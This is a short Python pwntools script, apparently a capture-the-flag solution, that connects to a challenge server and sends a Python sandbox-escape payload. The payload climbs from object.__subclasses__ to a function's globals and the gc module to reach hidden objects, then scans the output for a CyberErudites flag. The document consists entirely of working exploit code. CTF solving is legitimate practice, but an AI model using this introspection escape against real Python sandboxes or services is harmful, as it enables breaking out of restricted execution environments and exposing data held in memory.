#!/usr/bin/env python3

from pwn import *
import re
host, port = "inst.ctf.gdgalgiers.com", 1337
command = b"vars()['garbage_truck']=().__class__.__base__.__subclasses__()[125].__init__.__globals__['sys'].modules['gc'].get_objects"

def main():
	r = remote(host,port)
	r.recvuntil(b'>>> ')
	r.sendline(command)
	while True:
		try:
			result=r.recvline()
		except:
			print('EOF')
		ind= re.search(b'CyberErudites\{[a-zA-Z_0-9]+\}',result)
		if ind != None:
			print(ind.group(0))
			r.close()
			exit(0)
if __name__ == '__main__':
	main()
